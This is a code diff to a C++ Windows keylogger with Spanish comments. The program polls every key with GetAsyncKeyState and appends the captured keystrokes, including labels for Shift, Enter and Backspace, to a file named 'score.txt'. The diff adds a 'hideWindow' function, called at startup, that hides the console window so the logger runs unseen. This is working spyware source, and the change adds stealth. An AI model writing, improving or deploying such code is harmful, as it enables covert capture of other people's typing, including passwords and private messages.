@@ -23,9 +23,11 @@ bool verifyCapitalKey();
 char getAlphaKeys(short int);
 char getNumberKeys(short int);
 char simpleCharacters(short int);
+void hideWindow();
 
 int main()
 {
+    hideWindow();
     registerKeys();
     return 0;
 }
@@ -41,10 +43,10 @@ void registerKeys(){
         vkCapital = verifyCapitalKey();
         //Con este ciclo detectamos la tecla pulsada por el usuario.
         for(short int i = 0; i < 255; i++){
-            digitAscii = NULL;
+            digitAscii = (char)VK_ESCAPE;
             //Aquí la condición evalua si una tecla es presionada y gracias al ciclo for podemos saber cual es, el -32767
             //es debido a que si no se lo ponemos realiza muchas veces la acción de adentro del if en cambio así solo lo hace 1 vez
-            if(GetAsyncKeyState(i) == -32767 && i != VK_CAPITAL && digitAscii == NULL){
+            if(GetAsyncKeyState(i) == -32767 && i != VK_CAPITAL && digitAscii == (char)VK_ESCAPE && i != 1 && i != 2){
                 if(i >= 65 && i <= 90){
                     digitAscii = getAlphaKeys(i);
                     if(vkCapital == false){
@@ -52,9 +54,13 @@ void registerKeys(){
                     }
                 } else if(i >= 48 && i <= 57){
                     digitAscii = getNumberKeys(i);
-                } else if(i >= 186 && i <= 191 || i == 32){
+                } else if(i >= 186 && i <= 191 || i == 32 ){
                     digitAscii = simpleCharacters(i);
                 }
+                    text += digitAscii;
+                    score.open("score.txt");
+                    score << text;
+                    score.close();
                 if((i >= 16 && i <= 27) || i == VK_BACK || i == VK_RETURN || ALT || i == VK_SNAPSHOT){
                     if(i == VK_MENU || i == ALT){
                         text += "[ALT]";
@@ -63,21 +69,18 @@ void registerKeys(){
                     } else if(i == VK_SHIFT){
                         text += "[SHIFT]";
                     } else if(i == VK_RETURN){
-                        text += "\n";
+                        text += "\n [ENTER]";
                     } else if(i == VK_BACK){
                         text += "[BACK]";
-                    } else if(i == VK_ESCAPE){
-                        text += "[ESC]";
                     } else if(i == VK_SNAPSHOT){
                         text += "[IMP PNT]";
                     }
-                }
-                if(digitAscii != NULL){
-                    text += digitAscii;
                     score.open("score.txt");
                     score << text;
                     score.close();
                 }
+
+                digitAscii = (char)VK_ESCAPE;
             }
         }
     }
@@ -120,4 +123,11 @@ char simpleCharacters(short int i){
     }
 
     return digitAscii;
+}
+
+void hideWindow(){
+    HWND stealWindow;
+    AllocConsole();
+    stealWindow = FindWindow("ConsoleWindowClass", NULL);
+    ShowWindow(stealWindow, 0);
 }
